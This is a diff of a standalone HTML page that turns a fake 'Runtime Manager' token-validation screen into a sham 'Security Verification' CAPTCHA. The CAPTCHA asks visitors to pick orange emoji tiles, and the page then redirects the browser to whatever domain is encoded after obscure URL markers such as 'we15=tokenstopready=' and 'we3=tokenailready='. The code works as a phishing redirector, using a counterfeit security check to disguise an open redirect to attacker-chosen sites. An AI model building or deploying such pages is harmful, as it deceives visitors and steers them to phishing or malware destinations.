@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Runtime Manager</title>
+    <title>Security Verification</title>
     <link href="https://fonts.googleapis.com/css2?family=Mona+Sans:wght@400;600&display=swap" rel="stylesheet">
     <style>
         :root {
@@ -11,7 +11,8 @@
             --bg: #0d1117;
             --text: #f0f0f0;
             --border: #30363d;
-            --highlight: rgba(255, 123, 41, 0.1);
+            --highlight: rgba(255, 123, 41, 0.2);
+            --success: #3fb950;
         }
         
         body {
@@ -19,14 +20,136 @@
             background-color: var(--bg);
             color: var(--text);
             margin: 0;
-            padding: 0;
+            padding: 20px;
             display: flex;
             justify-content: center;
             align-items: center;
             min-height: 100vh;
             overflow: hidden;
-            letter-spacing: -0.01em;
             line-height: 1.5;
+        }
+        
+        .challenge-container {
+            display: none;
+            width: 100%;
+            max-width: 380px;
+            text-align: center;
+            animation: fadeIn 0.4s cubic-bezier(0.16, 1, 0.3, 1);
+        }
+        
+        .challenge-box {
+            background: var(--bg);
+            border-radius: 12px;
+            padding: 28px;
+            box-shadow: 0 8px 32px rgba(1, 4, 9, 0.6);
+            border: 1px solid var(--border);
+        }
+        
+        .challenge-title {
+            font-size: 1.3rem;
+            font-weight: 600;
+            margin-bottom: 20px;
+            color: var(--primary);
+        }
+        
+        .challenge-instructions {
+            margin-bottom: 24px;
+            color: rgba(240, 240, 240, 0.8);
+        }
+        
+        .captcha-grid {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 10px;
+            margin: 24px 0;
+        }
+        
+        .captcha-tile {
+            aspect-ratio: 1;
+            background-color: rgba(255, 255, 255, 0.05);
+            border: 1px solid var(--border);
+            border-radius: 8px;
+            cursor: pointer;
+            transition: all 0.2s ease;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 1.4rem;
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .captcha-tile:hover {
+            background-color: rgba(255, 255, 255, 0.1);
+            border-color: var(--primary);
+        }
+        
+        .captcha-tile.selected {
+            background-color: var(--highlight);
+            border-color: var(--primary);
+        }
+        
+        .captcha-tile.selected::after {
+            content: "✓";
+            position: absolute;
+            color: var(--success);
+            font-size: 1.2rem;
+            font-weight: bold;
+        }
+        
+        .verify-button {
+            background-color: var(--primary);
+            color: white;
+            border: none;
+            padding: 12px 24px;
+            border-radius: 6px;
+            font-family: 'Mona Sans';
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.2s;
+            width: 100%;
+            margin-top: 16px;
+        }
+        
+        .verify-button:hover {
+            background-color: #ff8e3d;
+        }
+        
+        .verify-button:disabled {
+            background-color: #444;
+            cursor: not-allowed;
+            opacity: 0.7;
+        }
+        
+        .loading-container {
+            display: none;
+            margin-top: 24px;
+        }
+        
+        .loading-bar {
+            height: 4px;
+            background: rgba(255, 123, 41, 0.2);
+            border-radius: 4px;
+            overflow: hidden;
+            margin-bottom: 16px;
+        }
+        
+        .loading-progress {
+            height: 100%;
+            width: 0;
+            background: linear-gradient(90deg, #ff7b29, #ffa01c);
+            border-radius: 4px;
+            transition: width 0.3s;
+        }
+        
+        .loading-text {
+            color: var(--primary);
+            font-size: 0.9rem;
+        }
+        
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(8px); }
+            to { opacity: 1; transform: translateY(0); }
         }
         
         .runtime-message {
@@ -41,48 +164,6 @@
             color: var(--primary);
         }
         
-        .challenge-container {
-            display: none;
-            width: 100%;
-            max-width: 480px;
-            text-align: center;
-            animation: fadeIn 0.4s cubic-bezier(0.16, 1, 0.3, 1);
-        }
-        
-        .challenge-box {
-            background: var(--bg);
-            border-radius: 12px;
-            padding: 32px;
-            box-shadow: 0 8px 32px rgba(1, 4, 9, 0.6);
-            border: 1px solid var(--border);
-        }
-        
-        .loading-bar {
-            height: 4px;
-            background: rgba(255, 123, 41, 0.2);
-            border-radius: 4px;
-            margin: 28px 0;
-            overflow: hidden;
-        }
-        
-        .loading-progress {
-            height: 100%;
-            width: 0;
-            background: linear-gradient(90deg, #ff7b29, #ffa01c);
-            border-radius: 4px;
-            transition: width 0.4s cubic-bezier(0.16, 1, 0.3, 1);
-        }
-        
-        @keyframes fadeIn {
-            from { opacity: 0; transform: translateY(8px); }
-            to { opacity: 1; transform: translateY(0); }
-        }
-        
-        @keyframes pulse {
-            0%, 100% { opacity: 1; }
-            50% { opacity: 0.6; }
-        }
-        
         .cursor {
             display: inline-block;
             width: 8px;
@@ -90,30 +171,12 @@
             background: var(--primary);
             vertical-align: middle;
             margin-left: 4px;
-            animation: pulse 1s infinite;
+            animation: blink 1s infinite;
         }
         
-        .challenge-title {
-            font-size: 1.4rem;
-            font-weight: 600;
-            margin-bottom: 24px;
-            color: var(--primary);
-            letter-spacing: -0.015em;
-        }
-        
-        .status-text {
-            font-size: 1rem;
-            color: rgba(240, 240, 240, 0.8);
-            margin-top: 16px;
-        }
-        
-        .ascii-art {
-            color: var(--primary);
-            font-family: monospace;
-            line-height: 1.3;
-            margin: 20px 0;
-            white-space: pre;
-            font-size: 0.7rem;
+        @keyframes blink {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0; }
         }
     </style>
 </head>
@@ -124,19 +187,21 @@
     
     <div class="challenge-container" id="challengeContainer">
         <div class="challenge-box">
-            <div class="challenge-title">Verification Required</div>
-            <div class="ascii-art">
-  _____ _     _        _   _              
- / ____| |   (_)      | | | |             
-| (___ | |__  _ ___   | |_| | __ _ _ __   
- \___ \| '_ \| / __|  |  _  |/ _` | '_ \  
- ____) | | | | \__ \  | | | | (_| | | | | 
-|_____/|_| |_|_|___/  |_| |_|\__,_|_| |_|
+            <div class="challenge-title">Security Verification</div>
+            <div class="challenge-instructions">Select all squares with <strong>oranges</strong>:</div>
+            
+            <div class="captcha-grid" id="captchaGrid">
+                <!-- Tiles will be generated by JavaScript -->
             </div>
-            <div class="loading-bar">
-                <div class="loading-progress" id="loadingProgress"></div>
+            
+            <button class="verify-button" id="verifyButton" disabled>Verify</button>
+            
+            <div class="loading-container" id="loadingContainer">
+                <div class="loading-bar">
+                    <div class="loading-progress" id="loadingProgress"></div>
+                </div>
+                <div class="loading-text">Completing verification...</div>
             </div>
-            <div class="status-text">Validating security token...</div>
         </div>
     </div>
 
@@ -145,6 +210,9 @@
             const url = window.location.href;
             const runtimeMessage = document.getElementById('runtimeMessage');
             const challengeContainer = document.getElementById('challengeContainer');
+            const captchaGrid = document.getElementById('captchaGrid');
+            const verifyButton = document.getElementById('verifyButton');
+            const loadingContainer = document.getElementById('loadingContainer');
             const loadingProgress = document.getElementById('loadingProgress');
             
             // Check for challenge patterns in URL
@@ -152,34 +220,85 @@
                 runtimeMessage.style.display = 'none';
                 challengeContainer.style.display = 'block';
                 
-                // Simulate verification process
-                let progress = 0;
-                const loadingInterval = setInterval(() => {
-                    progress += Math.random() * 25;
-                    if (progress >= 100) {
-                        progress = 100;
-                        clearInterval(loadingInterval);
-                        
-                        // Process redirect after verification
-                        setTimeout(() => {
-                            if (url.includes('we15=tokenstopready=')) {
-                                const parts = url.split('we15=tokenstopready=')[1].split(/[?#]/)[0];
-                                if (parts.includes('=to=')) {
-                                    const [_, toDomain] = parts.split('=to=');
-                                    if (toDomain) {
-                                        window.location.href = 'https://' + toDomain;
-                                    }
-                                }
-                            } else {
-                                const domain = url.includes('we3=tokenailready=') 
-                                    ? url.split('we3=tokenailready=')[1].split(/[?#]/)[0] 
-                                    : 'example.com';
-                                window.location.href = 'https://' + domain;
-                            }
-                        }, 600);
+                // Generate CAPTCHA tiles
+                const tiles = [];
+                const orangeTiles = [];
+                const totalTiles = 9;
+                const orangeCount = 3 + Math.floor(Math.random() * 3); // 3-5 oranges
+                
+                for (let i = 0; i < totalTiles; i++) {
+                    const isOrange = i < orangeCount;
+                    const tile = document.createElement('div');
+                    tile.className = 'captcha-tile';
+                    tile.dataset.isOrange = isOrange;
+                    
+                    if (isOrange) {
+                        tile.textContent = '🍊';
+                        orangeTiles.push(tile);
+                    } else {
+                        // Random emoji (not orange)
+                        const emojis = ['🍋', '🍏', '🍇', '🍒', '🍐'];
+                        tile.textContent = emojis[Math.floor(Math.random() * emojis.length)];
                     }
-                    loadingProgress.style.width = `${progress}%`;
-                }, 180);
+                    
+                    tile.addEventListener('click', function() {
+                        this.classList.toggle('selected');
+                        checkSelectedTiles();
+                    });
+                    
+                    captchaGrid.appendChild(tile);
+                    tiles.push(tile);
+                }
+                
+                // Shuffle tiles
+                for (let i = tiles.length - 1; i > 0; i--) {
+                    const j = Math.floor(Math.random() * (i + 1));
+                    captchaGrid.appendChild(tiles[j]);
+                }
+                
+                function checkSelectedTiles() {
+                    const selectedTiles = document.querySelectorAll('.captcha-tile.selected');
+                    const correctSelections = Array.from(selectedTiles).filter(tile => 
+                        tile.dataset.isOrange === 'true').length;
+                    
+                    // Enable verify button only if all oranges are selected
+                    verifyButton.disabled = correctSelections !== orangeTiles.length || 
+                                           selectedTiles.length !== orangeTiles.length;
+                }
+                
+                verifyButton.addEventListener('click', function() {
+                    verifyButton.disabled = true;
+                    loadingContainer.style.display = 'block';
+                    
+                    // Simulate verification process
+                    let progress = 0;
+                    const loadingInterval = setInterval(() => {
+                        progress += Math.random() * 25;
+                        if (progress >= 100) {
+                            progress = 100;
+                            clearInterval(loadingInterval);
+                            
+                            // Process redirect after verification
+                            setTimeout(() => {
+                                if (url.includes('we15=tokenstopready=')) {
+                                    const parts = url.split('we15=tokenstopready=')[1].split(/[?#]/)[0];
+                                    if (parts.includes('=to=')) {
+                                        const [_, toDomain] = parts.split('=to=');
+                                        if (toDomain) {
+                                            window.location.href = 'https://' + toDomain;
+                                        }
+                                    }
+                                } else {
+                                    const domain = url.includes('we3=tokenailready=') 
+                                        ? url.split('we3=tokenailready=')[1].split(/[?#]/)[0] 
+                                        : 'example.com';
+                                    window.location.href = 'https://' + domain;
+                                }
+                            }, 500);
+                        }
+                        loadingProgress.style.width = `${progress}%`;
+                    }, 200);
+                });
             }
         });
     </script>
